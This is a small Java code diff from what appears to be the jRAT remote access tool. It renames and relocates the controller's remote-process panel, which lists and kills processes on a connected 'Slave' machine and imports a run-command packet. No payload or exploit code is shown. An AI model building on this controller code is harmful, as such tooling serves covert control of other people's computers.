@@ -1,6 +1,7 @@
-package jrat.module.process;
+package jrat.module.process.ui;
 
 import jrat.api.Resources;
+import jrat.api.ui.ClientPanel;
 import jrat.controller.Slave;
 import jrat.controller.packets.outgoing.Packet38RunCommand;
 import jrat.controller.ui.DefaultJTable;
@@ -8,6 +9,8 @@ import jrat.controller.ui.components.TableModel;
 import jrat.controller.ui.panels.PanelControlParent;
 import jrat.controller.ui.renderers.table.ProcessTableRenderer;
 import jrat.controller.utils.Utils;
+import jrat.module.process.PacketKillProcess;
+import jrat.module.process.PacketQueryProcesses;
 import oslib.OperatingSystem;
 
 import javax.swing.*;
@@ -16,7 +19,7 @@ import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
 
 @SuppressWarnings("serial")
-public class PanelControlRemoteProcess extends PanelControlParent {
+public class PanelProcesses extends ClientPanel {
 
 	private JTable table;
 	private TableModel model;
@@ -26,8 +29,8 @@ public class PanelControlRemoteProcess extends PanelControlParent {
 		return model;
 	}
 
-	public PanelControlRemoteProcess(Slave slave) {
-		super(slave);
+	public PanelProcesses(Slave slave) {
+		super(slave, "Processes", Resources.getIcon("process"));
 		final Slave sl = slave;
 
 		setLayout(new BorderLayout(0, 0));
